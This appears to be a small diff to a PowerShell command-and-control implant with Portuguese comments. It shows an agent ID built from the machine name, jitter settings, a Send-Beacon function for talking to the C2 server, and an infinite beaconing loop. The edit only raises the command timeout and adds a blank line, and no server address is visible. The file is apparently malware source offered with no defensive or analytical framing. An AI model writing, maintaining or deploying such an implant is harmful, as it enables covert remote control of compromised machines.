@@ -7,7 +7,7 @@ param(
 # Configurações
 $AgentID = [System.Environment]::MachineName + "_" + (Get-Random -Maximum 9999)
 $Jitter = 5
-$CommandTimeout = 60
+$CommandTimeout = 120
 
 # Função para comunicação com C2
 function Send-Beacon {
@@ -160,3 +160,4 @@ while ($true) {
     $sleepTime = $BeaconInterval + (Get-Random -Minimum -$Jitter -Maximum $Jitter)
     Start-Sleep -Seconds $sleepTime
 }
+
